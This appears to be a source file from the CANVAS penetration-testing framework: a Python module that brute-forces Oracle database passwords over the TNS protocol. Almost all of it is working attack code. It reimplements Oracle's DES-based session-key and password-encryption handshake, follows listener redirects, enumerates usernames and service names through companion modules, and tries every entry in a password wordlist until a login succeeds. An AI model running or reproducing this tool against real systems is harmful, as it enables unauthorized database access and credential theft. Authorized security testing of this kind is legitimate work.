#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")

import os
import getopt
import socket
import timeoutsocket
import sys
import struct
import time
import array
import select
import string

# CANVAS modules
from exploitutils import *
from tcpexploit import *


import canvasengine

import dunicode
import libs.Crypto.Cipher.DES as DES

#import des
#import pyDes
# TNS lib
import libs.tnslib as tnslib

# GUI info
NAME="Oracle Brute Force Password"
DESCRIPTION="Oracle <= Password"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Oracle"
DOCUMENTATION["Notes"]="Will attempt to brute force a password for a given username"
DOCUMENTATION["Notes2"]="If not given a username, this will call oraclegetuser to get a potential one to brute force"
DOCUMENTATION["Commandline Notes"]="""
This is an example of using oraclegetpwd from the commandline. Note the need to have the full service name
and the -l 1 -d 1 arguments (placeholders for a listener shell)

bash-3.1$ exploits/oraclegetpwd/oraclegetpwd.py -t 192.168.255.146 -O dbasename:"(SERVICE_NAME=MODOSE)" -F oraclepasswords -l 1 -d 1

"""
VERSION="0.3"

PROPERTY = {}
PROPERTY['TYPE'] = "Tools"

NOTES="""
Attempt to identify Oracle usernames   
"""

CHANGELOG="""
"""


TNS = tnslib.TNS()
        

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.host = "vmware.local"
        self.port = 1521
        self.covertness = 0
        self.ssl = 0
        self.done = 0
        self.version = 1
        self.dbasename=[] 
        self.version=0
        self.name=NAME
        self.results = []
        self.filename = ""
        return

    def connectToHost(self, t_host, t_port):
        s=self.gettcpsock()
        try:
            ret=s.connect((t_host, t_port))
        except:
            self.raiseError("Could not connect to %s:%d"% (self.host, self.port))
        if ret==-1:
            self.raiseError("Could not connect to %s:%d"% (self.host, self.port))
        return s
    
    def test(self):
        #just verify 1521 is listening     
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Could not connect to Oracle TNS listener at %s:%d"% (self.host, self.port))
            return 0
        self.log("Connected to TNS listener at %s:%d"% (self.host, self.port))

        return 1
    
    
    #initial session setup data
    def setupSession(self,s):
        tnsdata = tnslib.TNSDATA()
        
        #send SNS packet
        tnsdata.SNS(self.version)
        snspkt = tnsdata.getData()
        TNS.sendDataRequest(s,snspkt)
        if (TNS.recvTNSPkt(s)==0):
            self.log("Problem with response to SNS packet")
            return 0
        
        #WINNT request 
        tnsdata.WINNT()
        winntpkt = tnsdata.getData()
        TNS.sendDataRequest(s,winntpkt)
        if (TNS.recvTNSPkt(s)==0):
            self.log("Problem with response to WINNT packet")
            return 0
        
        #<<< request
        tnsdata.LESS(self.version)
        lesspkt = tnsdata.getData()
        TNS.sendDataRequest(s,lesspkt)
        if (TNS.recvTNSPkt(s)==0):
            return 0
        return 1

    def getEncryptedSessionkey(self):
        tnsdata = tnslib.TNSDATA()        
        #print "%s"%hexprint(TNS.tns_data)
        tnsdata.parseDataLayer(TNS.tns_data)
        #print "%d %d %s"%(tnsdata.data_flag,tnsdata.type,hexprint(tnsdata.data))
        #print "%s"%hexprint(tnsdata.data[0])
        
        b = struct.unpack("B",tnsdata.data[0])[0]
        if (b==1): #format of response if we're doing the long (v1) version of auth/pwd packets
            keyloc=tnsdata.data.find("AUTH_SESSKEY")
            #print "keyloc:%s"% keyloc
            if (keyloc>0):
                keyloc = keyloc + 17 #ideally we'd parse out the data packet contents properly, if we had any clue what their format is supposed to be   
            else:
                self.log("Key not found..?")
                return(0)
        else: #doing short version
            keyloc = 3
            
        end = keyloc + 16
        return(tnsdata.data[keyloc:end])	
            
            
    def padStr(self,str):
        #pad it to mod 8
        l = len(str)
        #print "len: %d"%l
        r = len(str) % 8
        
        n = 8-r
        
        for i in range(n):
            str +=chr(0)
        
        return str

        
    def manip(self,u,p):
        #can't remember what this was all about - might not be as complex as I originally thought?
        ret = ""

        str = u + p

        str = string.upper(str)
        
        #unicode
        str = dunicode.win32ucs2(str,"")

        #reverse every 2 bytes
        i = 0
        str2 = ""
        buf = ""
        while i < len(str):
            buf = str[i:i+2]
            buf2 = buf[::-1]
            str2 += buf2
            buf2 = ""
            buf = ""
            i += 2
        str = str2

        #print "str: %s"%hexprint(str)
        
        str = self.padStr(str)
#        print "moddedstr: %s"%hexprint(str)
        
        ret = str
        return ret
    
    #def pydesgetSecretKey(self,uname,pwd):
        #ret = 0

        #manip = manipulated uname & pwd
        #manip = self.manip(uname,pwd)
        #l = len(manip)
        #print "manip: %s"%manip

        #deskey1 = binstring("0123456789ABCDEF")
        
        #enc1 = des(manip,deskey1)
        #d = pyDes.des(deskey1,pyDes.CBC, "\0\0\0\0\0\0\0\0")

        #enc = d.encrypt(manip," ")
        #print "enc: %s"%hexprint(enc)
        #value1 = enc[l-8:]
        #print "value1: %s"%hexprint(value1)
        
        #reset key to be value1
        #d# = pyDes.des(value1,pyDes.CBC, "\0\0\0\0\0\0\0\0")
        #enc = d.encrypt(manip)
        #value2 = enc[l-8:]
        #print "value2: %s"%hexprint(value2)
        
        #r#et = value2
        #print "pydesgetsecretkey returning: %s"%ret
        #return ret
    
    
    
    def getSecretKey(self,uname,pwd):
        ret = 0

        #manip = manipulated uname & pwd
        manip = self.manip(uname,pwd)
        l = len(manip)
        #print "manip: [%s] %s"%(manip,hexprint(manip))

        deskey1 = binstring("0123456789ABCDEF")
        
        #init
        d = DES.DES(deskey1,DES.DES_CBC_MODE, IV="\0\0\0\0\0\0\0\0")
        enc = d.encrypt(manip)
        #print "enc2: %s"%hexprint(enc2)		
        
        #use last 8 bytes from first encrypt as key
        value1 = enc[l-8:]
        #print "value1: %s"%hexprint(value1)
        
        #reset key to be value1
        d = DES.DES(value1, DES.DES_CBC_MODE, IV="\0\0\0\0\0\0\0\0")
        enc = d.encrypt(manip)
        #print "enc2: %s"%hexprint(enc2)		
        
        value2 = enc[l-8:]
        #print "value2: %s"%hexprint(value2)
        
        ret = value2
        #print "getsecretkey returning: %s"%ret
        return ret
    
    def getPasswordKey(self,data,key):
        ret = ""
        #data is recvd from server, key was derived from uname/pwd manipulation   
        data = binstring(data)
        
        d = DES.DES(key,DES.DES_CBC_MODE, IV="\0\0\0\0\0\0\0\0")
        dec = d.decrypt(data)
        #print "dec: %s"%hexprint(dec)
        
        l = len(data)
        
        dec = dec[l-8:]
        
        return dec
    
    def getEncPassword(self,password,key):
        password = self.padStr(password)
        d = DES.DES(key,DES.DES_CBC_MODE, IV="\0\0\0\0\0\0\0\0")
        encpwd = d.encrypt(password)
        #print "encpwd: %s"%hexprint(encpwd)
        
        return encpwd
        
    def authRequest(self,s):
        tnsdata = tnslib.TNSDATA()
        #login request
        if ((self.version == TNS.TNS_V9) or (self.version == TNS.TNS_V10)):
            tnsdata.LOGINv2(self.user,self.version)
        else:
            tnsdata.LOGINv1(self.user,self.version)
        loginpkt = tnsdata.getData()
        TNS.sendDataRequest(s,loginpkt)
        if (TNS.recvTNSPkt(s)==0):
            self.log("Error receiving response to auth request")
            return 0
        if (TNS.packet_type != TNS.TNS_TYPE_DATA): 
            self.log("Did not receive expected TNS_TYPE_DATA in response to auth request - bad username?")
            return(0)
        return 1
    
    def doMarkers(self,s):
        if (TNS.packet_type == TNS.TNS_TYPE_MARKER): 
            mdata = TNS.tns_data
            #self.log("Marker packet recvd, data: %s"%hexprint(mdata))
            #self.log("assuming another marker is coming")
            TNS.recvTNSPkt(s)
            if (TNS.packet_type == TNS.TNS_TYPE_MARKER):
                #need to build in Marker data to tns lib at some point
                mdata = TNS.tns_data
                #self.log("recv'd second marker pkt, data: %s"%hexprint(mdata))
                #send marker back
                #self.log("sending marker data back")
                TNS.sendMarker(s,mdata) 
                if (TNS.recvTNSPkt(s)==0):
                    self.log("Error receiving response to marker request")
                    return 0
                str = onlystrings(TNS.tns_data)
                self.log("Received Marker strings: %s"%str)
        return 1
    
    def getKey(self):
        if (TNS.packet_type == TNS.TNS_TYPE_DATA):    #should have received encrypted session key
            #self.log("Recv'd data packet in response to auth request")
            enckey = self.getEncryptedSessionkey()            
            if (enckey==0):
                self.log("Error getting encrypted key from packet")
                return 0
            self.log("Recvd AUTH_SESSKEY: %s"%enckey)
        else:
            self.log("Did not recv data when expecting session key?")
            return 0
        return enckey
    
    def encPwd(self,enckey,pwd):
        ret = 0
        #extract secret key doing uname/password manipulation
        #seckey = self.pydesgetSecretKey(self.user,pwd)
        seckey = self.getSecretKey(self.user,pwd)
        #print "seckey: %s"%hexprint(seckey)
            
        #decrypt password encryption key from server data using secret key
        passkey = self.getPasswordKey(enckey,seckey)
        #print "passkey: %s"%hexprint(passkey)
            
        #create encrypted password using password encryption key
        encryptedpwd = self.getEncPassword(pwd,passkey)
        #print "encryptedpwd: %s"%hexprint(encryptedpwd)
        e1 = encryptedpwd[:4]
        e2 = encryptedpwd[4:] 
            
        encpwd = rawhexstr(e1) + rawhexstr(e2)
        encpwd = string.upper(encpwd)
            #print "encpwd: %s"%encpwd
        return encpwd
    
    def pwdRequest(self,s,encpwd):
        tnsdata = tnslib.TNSDATA()
        if ((self.version == TNS.TNS_V9) or (self.version == TNS.TNS_V10)):
            tnsdata.PWDv2(self.version,self.user,encpwd)
        else:
            tnsdata.PWDv1(self.version,self.user,encpwd)
        pwdpkt = tnsdata.getData()
        #print "pwdpkt: %s"%hexprint(pwdpkt)
        TNS.sendDataRequest(s,pwdpkt)
        if (TNS.recvTNSPkt(s)==0):
            self.log("Error receiving response to password packet")
            return 0
        return 1
    
    def testSuccess(self):
        if not (TNS.packet_type == TNS.TNS_TYPE_DATA):
            return 0
        tnsdata = tnslib.TNSDATA()
        #print ("parsing %s"%hexprint(TNS.tns_data))
        tnsdata.parseDataLayer(TNS.tns_data)
        #self.log("Testing Success, data type is %d"%tnsdata.type)
        if (tnsdata.type == tnsdata.TNS_DATA_TYPE_EIGHT):
            return 1 
        if (tnsdata.type == tnsdata.TNS_DATA_TYPE_FOUR):
            if tnsdata.data.count("ORA-01017") or tnsdata.data.count("denied"):
                return 0
            else:
                return 1
        return 0
    
    def processFail(self):
        tnsdata = tnslib.TNSDATA()
        tnsdata.parseDataLayer(TNS.tns_data)
        if not (tnsdata.type == tnsdata.TNS_DATA_TYPE_FOUR):
            self.log("Unexpected password fail response - expecting type 4")
            return 0
        if not (tnsdata.data.count("ORA-01017") or tnsdata.data.count("denied")):
            self.log("Unexpected password fail response - expecting denied string")
            return 0	
        return 1
    
    
    def tryLogin(self,s,pwd):
        succ = self.authRequest(s) #send login pkt
        if not succ: #auth failed
            self.log("Error: failure sending username, returning")
            return 0
                
        k = self.getKey() #get enckey
        if not k:
            self.log("Error getting key, returning")
            return 0
        
        encp = self.encPwd(k,pwd) #do key gen
        
        succ = self.pwdRequest(s,encp) #send pwd pkt
        if not succ: #pwd failed
            self.log("Error: failure sending password, returning")
            return 0
        
        succ = self.testSuccess()
        if succ:
            return 1 #pwd found!
        
        self.log("password failed")
        
        if (TNS.packet_type == TNS.TNS_TYPE_MARKER): 
            self.doMarkers(s)
            
        succ = self.processFail()
        if not succ:
            self.log("Problem processing failed login")
            
        return 0

    def getPasswords(self):
        #print 'Getting pwds from ',self.filename
        try:
            pwds=file(self.filename).readlines()
        except:
            self.log("Failed to open password file %s"%self.filename)
            return 0
#        print 'read pwdss: ',pwds
        return pwds

    
    def getRedirectInfo(self):
        redirect = tnslib.TNSREDIRECT()
        redirect.parseRedirectLayer(TNS.tns_data)  
        rdata = redirect.redirect_data
        if rdata.count("(ADDRESS="):
            hoststrloc = rdata.find("HOST=")
            portstrloc = rdata.find("PORT=")
            host = rdata[hoststrloc + 5:portstrloc - 2]
            port = int(rdata[portstrloc + 5:portstrloc + 9])
        else:
            self.log("unknown redirect info recvd: %s" %rdata)
        ret = (host, port)
        return ret
            
                
    def checkDbaseInfo(self):
        """calls out to oraclegetinfo module to see if we can
        get the version, databasename, etc.
        """
        dbname=self.argsDict.get("dbasename",self.dbasename)
        self.log("Version=%s dbasename=%s"%(self.version,dbname))

        if (not self.version) or ((dbname in [ [], "", None ] )):
            self.log("do not have version or dbasename - attempting oraclegetinfo")
            getinfo = self.engine.getModuleExploit("oraclegetinfo")
            getinfo.link(self)
            getinfo.argsDict["port"]=self.port
            getinfo.run()
            self.log("Got results from oraclegetinfo...now using them for oraclegetpwd")
        else:
            self.log("Got results from user - dbname=%s"%dbname)

        if (not self.version):
            self.log("Setting version to %s"%getinfo.result["version"])
            self.version = getinfo.result["version"]

        if (self.argsDict.get("dbasename",self.dbasename) in ["",[]]):
            if (self.version == TNS.TNS_V10): #v10                
                self.log("v10 detected (cannot retrieve dbase name without a password). If known, supply target service (database) name as -O flag. v10 Trying default ORCL anyway.")                
                self.dbasename = "(SERVICE_NAME=ORCL)"
            else:
                self.log("Current dbasename is %s"%self.dbasename)
                if self.dbasename in ["",[]]:
                    res = getinfo.result["dbasenames"]
                    if res[0].count("PLSExtProc"):
                        res=res[1:]+[res[0]]
                    if len(res) > 1:
                        self.log("NOTE: More than one possible database name - picking %s"%res[0])
                        self.log("For another database pass as -O dbasename parameter")
                    self.dbasename = res[0]
        #print("dbasename:%s,version:%s"%(self.dbasename,self.version))       
                        
        if (not self.user):
            self.log("do not have username - attempting oraclegetuser")
            getuser = self.engine.getModuleExploit("oraclegetuser")
            getuser.link(self)
            getuser.argsDict["dbasename"] = self.dbasename
            getuser.argsDict["version"] = self.version
            getuser.argsDict["filename"] = getuser.defaultfile
            getuser.argsDict["port"] = self.port
            getuser.run()
            if len(getuser.results)==0:
                return 0
            res = getuser.results[0]
            accounts = res["accounts"]
            self.user = accounts[0]
            if len(accounts)>1:
                self.log("NOTE: Multiple accounts found, using username: \"%s\" - for another pass as -U parameter"%accounts[0])                   

        return 1
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.user=self.argsDict.get("user",self.user)
        if (self.argsDict.get("dbasename",self.dbasename) not in ["",[]]):
            self.dbasename = self.argsDict.get("dbasename",self.dbasename)
        version=self.argsDict.get("version",self.version) 
        self.version = TNS.assignVersion(version)
        self.filename = self.argsDict.get("filename",self.filename)
        if not (self.filename):
            self.usage()
        
        #check we have target dbase version, name(s) & username
        res = self.checkDbaseInfo()
        if not res:
            self.log("GetPassword: failed to check dbase version/name/username - exiting.")
            return 0

        self.setInfo("%s targeting %s:%d (in progress)"% (NAME, self.host, self.port))
        self.log("%s targeting %s:%d (in progress)"% (NAME, self.host, self.port))
            
    
        #        TNS = tnslib.TNS()
        
            #get passwords to try
        passwords = self.getPasswords() #get usernames from file
                        
        results = ""
        firstpassword = 1
        v9_prevauthfailed = 0
        database = self.dbasename


        for password in passwords:
            password = password.strip()
            if firstpassword or v910startagain: #might not need the prevfailed check
                firstpassword = 0
                v910startagain = 0
                    
                #get redirect
                s = self.connectToHost(self.host, self.port)
                if s:
                    self.log("got tcp session with %s:%d"% (self.host, self.port))
                    tnsconn = tnslib.TNSCONNECT()
                    self.log("Connecting to %s database %s"%(self.host,database))
                    req = tnsconn.getDatabaseNameConnectReq(self.host,database,self.port)
                    TNS.sendConnectRequest(s,req) 
                    TNS.recvTNSPkt(s)
                    if (TNS.packet_type == TNS.TNS_TYPE_REDIRECT): #should have received redirect
                        #self.log("Recvd redirect")
                        (rd_host, rd_port) = self.getRedirectInfo()
                        s.close
                            
                        #connect to redirect
                        s = self.connectToHost(rd_host, rd_port)
                        if s:
                            self.log("Redirecting to %s:%d"% (rd_host,rd_port))
                            tnsconn = tnslib.TNSCONNECT()
                            req = tnsconn.getDatabaseNameConnectReq(self.host,database,rd_port) #FIXME self.port ?
                            TNS.sendConnectRequest(s,req) 
                            TNS.recvTNSPkt(s)
                            if (TNS.packet_type == TNS.TNS_TYPE_ACCEPT):    #should have received database info
                                self.log("TNS connection established with redirect service")
                            else:
                                self.log("Redirect service rejected TNS connect request...?")
                            #setup auth
                            setup_auth = self.setupSession(s) #this should go in tnslib
                            if (setup_auth==1):
                                self.log("Setup auth session OK")                                    
                            else:
                                self.log("Failed to establish auth session")
                                break				         
                        else:
                            self.log("Failed to establish tcp session with redirect service: %s:%d"%(rd_host,rd_port))
                    elif (TNS.packet_type == TNS.TNS_TYPE_REFUSE): 
                        self.log("TNS Connect Request to %s was refused"%database)
                        break
                    else:
                        self.log("TNS Connect Request to %s received unexpected response"%(database))
                        self.log("Packet type %s"%(TNS.packet_type))
                        break
                else:
                    self.log("Could not establish tcp session with %s:%d"%(self.host, self.port))
        
            if setup_auth:
                self.log("Trying: %s:%s"% (self.user,password))
                result = self.tryLogin(s,password)
                if result:
                    self.log("!!Password found!!")
                    self.results.append(password)
                    self.setSucceeded()
                    break
                    #v910startagain = 1
                elif ((self.version == TNS.TNS_V9) or (self.version == TNS.TNS_V10)): #Oracle v9 and v10 need to reconnect to try again
                    self.log("Auth attempt failed - need to re-establish entire connection (V9&10)")
                    v910startagain = 1
                    s.close
                    
        #self.log("Finished trying all passwords") 
            
                
    #self.log("Finished trying all databases") 
                                
        if self.ISucceeded() or self.done:
            self.setInfo("%s targeting %s:%d - done (success!)"% (NAME, self.host, self.port))
            self.log("Password results for %s: %s on database %s"%(self.user,self.results,database))
            return 1        

        self.setInfo("%s targeting %s:%d - done (failed!)"% (NAME, self.host, self.port))
        self.log("done.")
        return 0

    
    def usage(self):

        app = theexploit()
        print "Usage: "+sys.argv[0]+" -t target -F passwordfile [-U username] [-T] [-O dbasename:\"(SERVICE_NAME=testdbase)\"] [-v 8|9|10] [ -p targetport:%s] [-C covertness]"%(app.port)
        app.displayVersions()
    

if __name__== '__main__':
    
    print "Running "+NAME+" exploit v "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)

    if ret not in [1,0]:
        ret.interact() 
        
